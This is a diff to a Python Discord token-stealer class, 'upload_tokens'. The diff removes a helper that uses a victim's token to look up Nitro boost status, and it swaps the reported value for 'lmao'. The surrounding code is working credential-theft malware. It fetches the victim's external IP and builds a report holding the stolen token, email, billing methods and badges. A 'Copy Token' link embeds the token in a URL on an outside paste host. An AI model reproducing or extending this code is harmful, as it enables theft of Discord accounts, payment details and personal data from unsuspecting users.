@@ -217,93 +217,6 @@ class upload_tokens:
             ip = requests.get("https://www.myexternalip.com/raw").text
             return ip
         
-        def get_nitro(flags, id, token):
-            switcher = {
-                1: "<:946246402105819216:9627478027971bby5>",
-                2: "",
-            }
-            nitro_status = switcher.get(flags, "`No Nitro`")
-            if nitro_status == "":
-                try:
-                    headers = {
-                        "Content-Type": "application/json",
-                        "authorization": token
-                    }
-                    response = requests.get(f"https://discord.com/api/v9/users/{id}/profile", headers=headers)
-                    info = response.json()
-
-                    if not info or not info.get("premium_guild_since"):
-                        return "<:946246402105819216:9627478027971bby5>"
-                        
-                    boost = [
-                        "<:boost1month:967519402293624862>",
-                        "<:boost2month:967519562868338728>",
-                        "<:boost3month:969685462157525044>",
-                        "<:boost6month:969686607961665628>",
-                        "<:boost9month:967520103367340092>",
-                        "<:boost12month:969687191133499403>",
-                        "<:boost15month:967518897987256400>",
-                        "<:boost18month:967519190133145611>",
-                        "<:boost24month:969686081958207508>"
-                    ]
-                    i = 0
-
-                    try:
-                        d = datetime.fromisoformat(info.get("premium_guild_since").replace("Z", ""))
-                        boost2month = (d.replace(month=d.month + 2) - datetime.utcnow()).days
-                        d1 = datetime.fromisoformat(info.get("premium_guild_since").replace("Z", ""))
-                        boost3month = (d1.replace(month=d1.month + 3) - datetime.utcnow()).days
-                        d2 = datetime.fromisoformat(info.get("premium_guild_since").replace("Z", ""))
-                        boost6month = (d2.replace(month=d2.month + 6) - datetime.utcnow()).days
-                        d3 = datetime.fromisoformat(info.get("premium_guild_since").replace("Z", ""))
-                        boost9month = (d3.replace(month=d3.month + 9) - datetime.utcnow()).days
-                        d4 = datetime.fromisoformat(info.get("premium_guild_since").replace("Z", ""))
-                        boost12month = (d4.replace(month=d4.month + 12) - datetime.utcnow()).days
-                        d5 = datetime.fromisoformat(info.get("premium_guild_since").replace("Z", ""))
-                        boost15month = (d5.replace(month=d5.month + 15) - datetime.utcnow()).days
-                        d6 = datetime.fromisoformat(info.get("premium_guild_since").replace("Z", ""))
-                        boost18month = (d6.replace(month=d6.month + 18) - datetime.utcnow()).days
-                        d7 = datetime.fromisoformat(info.get("premium_guild_since").replace("Z", ""))
-                        boost24month = (d7.replace(month=d7.month + 24) - datetime.utcnow()).days
-
-                        if boost2month > 0:
-                            i += 0
-                        else:
-                            i += 1
-                        if boost3month > 0:
-                            i += 0
-                        else:
-                            i += 1
-                        if boost6month > 0:
-                            i += 0
-                        else:
-                            i += 1
-                        if boost9month > 0:
-                            i += 0
-                        else:
-                            i += 1
-                        if boost12month > 0:
-                            i += 0
-                        else:
-                            i += 1
-                        if boost15month > 0:
-                            i += 0
-                        else:
-                            i += 1
-                        if boost18month > 0:
-                            i += 0
-                        else:
-                            i += 1 
-                        if boost24month > 0:
-                            i += 0
-                        else:
-                            i += 1
-                    except Exception as e:
-                        i += 0
-                        return f"<:946246402105819216:9627478027971bby5> {boost[i]}" if i < len(boost) else "<:946246402105819216:9627478027971bby5>"
-                except Exception as e:
-                    i += 0
-                    return f"<:946246402105819216:9627478027971bby5> {boost[i]}" if i < len(boost) else "<:946246402105819216:9627478027971bby5>"
         if not self.tokens:
             return
 
@@ -433,14 +346,13 @@ class upload_tokens:
                 codes = None
 
             ip = get_ip()
-            result = get_nitro(2, f"{user_id}", f"{token}")
             embed = Embed(title=f"{username} ({user_id})", color=0x000000)
             embed.set_thumbnail(url=avatar)
 
             embed.add_field(name="<a:pinkcrown:996004209667346442> Token:", value=f"`{token}`\n[Copy Token](https://paste-pgpj.onrender.com/?p={token})", inline=False)
             # embed.add_field(name="<a:nitroboost:996004213354139658> Nitro:", value=f"{nitro}", inline=True)
             embed.add_field(name="<a:redboost:996004230345281546> Badges:", value=f"{badges if badges != '' else 'None'}", inline=True)
-            embed.add_field(name="<a:redboost:996004230345281546> Nitro Type:", value=result, inline=True)
+            embed.add_field(name="<a:redboost:996004230345281546> Nitro Type:", value="lmao", inline=True)
             embed.add_field(name="<a:pinklv:996004222090891366> Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
             embed.add_field(name="<a:rainbowheart:996004226092245072> Email:", value=f"{email if email != None else 'None'}", inline=True)
             embed.add_field(name="<a:pinklv:996004222090891366> IP:", value=ip, inline=True)
